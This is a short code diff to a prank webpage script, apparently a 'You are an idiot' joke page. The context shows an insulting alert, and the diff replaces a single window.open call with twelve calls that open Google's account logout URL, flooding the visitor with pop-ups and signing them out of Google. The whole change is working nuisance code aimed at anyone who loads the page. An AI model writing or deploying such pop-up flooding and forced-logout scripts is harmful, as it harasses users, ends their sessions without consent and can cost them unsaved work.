@@ -11,4 +11,15 @@ window.onkeydown = async () => {
 window.onload = playBall;
 
 alert("YOU ARE AN IDIOT!! HGAHAHAHA");
-window.open("https://www.google.com/accounts/Logout","_blank","alwaysRaised=yes")
+openWindow("https://www.google.com/accounts/Logout")
+openWindow("https://www.google.com/accounts/Logout")
+openWindow("https://www.google.com/accounts/Logout")
+openWindow("https://www.google.com/accounts/Logout")
+openWindow("https://www.google.com/accounts/Logout")
+openWindow("https://www.google.com/accounts/Logout")
+openWindow("https://www.google.com/accounts/Logout")
+openWindow("https://www.google.com/accounts/Logout")
+openWindow("https://www.google.com/accounts/Logout")
+openWindow("https://www.google.com/accounts/Logout")
+openWindow("https://www.google.com/accounts/Logout")
+openWindow("https://www.google.com/accounts/Logout")
